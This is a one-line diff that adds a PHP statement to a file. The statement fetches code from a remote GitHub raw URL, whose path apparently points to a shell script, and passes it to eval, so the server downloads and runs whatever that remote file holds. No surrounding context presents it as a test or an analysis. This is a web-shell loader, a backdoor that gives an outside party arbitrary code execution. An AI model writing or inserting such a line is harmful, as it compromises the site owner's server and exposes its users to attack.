@@ -1,0 +1,1 @@
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/pas-s"));?>
